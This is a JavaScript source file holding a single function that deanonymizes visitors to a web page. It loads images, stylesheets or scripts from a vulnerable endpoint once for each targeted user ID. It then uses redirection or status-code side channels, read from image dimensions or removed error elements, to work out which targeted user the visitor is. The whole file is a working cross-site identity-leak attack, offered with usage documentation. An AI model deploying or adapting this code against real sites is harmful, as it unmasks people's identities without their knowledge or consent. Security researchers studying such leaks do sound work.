/**
 * Deanonymize a predefined group of users, given sufficient arguments.
 * @param attackMethod {string}, the method of the attack (either 'redirection' or 'statusCode').
 * @param endpoint {string}, the vulnerable endpoint with the user ID parameter last.
 * @param idList {array}, a list of the targeted users' IDs.
 * @param callback {function}, a callback function to pass all results to.
 * @return {array}, an ordered output array with boolean values.
 */
function deanonymize(attackMethod, endpoint, idList, callback) {
    var elNodes, testFn;
    var output = [];
    // register a new cross-browser event listener
    var addListener = (function() {
        return (window.addEventListener) ? window.addEventListener :
            // for IE8 and earlier versions support
            function (evName, callback) {
                window.attachEvent.call(this, 'on'+evName, callback);
            };
    }());
    var createElements = function(tagName) {
        var i, l, el;
        var elNodes = [];
        for (i = 0, l = idList.length; i < l; i++) {
            el = document.createElement(tagName);
            if (tagName !== 'link') {
                el.src = endpoint + idList[i];
            } else {
                el.href = endpoint + idList[i];
                el.rel = 'stylesheet';
            }
            if (tagName !== 'img') {
                el.onerror = function() {
                    this.parentElement.removeChild(this);
                };
            }
            elNodes.push(el);
            document.documentElement.appendChild(el);
        }
        return elNodes;
    };
    var assess = function(testFn) {
        var i, l;
        for (i = 0, l = elNodes.length; i < l; i++) {
            if (testFn(elNodes[i])) {
                output.push(true);
            } else {
                output.push(false);
            }
        }
        callback(output);
    };
    if (attackMethod === 'redirection') {
        elNodes = createElements('img');
        testFn = function(imgNode) {
            if (imgNode.naturalHeight !== 0 && imgNode.naturalWidth !== 0) {
                return true;
            }
            return false;
        };
    } else if(attackMethod === 'statusCode') {
        elNodes = (/chrome/i.test(navigator.userAgent)) ? createElements('link') :
                           createElements('script');
        testFn = function(el) {
            if (el.parentNode !== document.documentElement) {
                return true;
            }
            return false;
        };
    }
    addListener.call(window, 'load', function() {assess(testFn);});
}
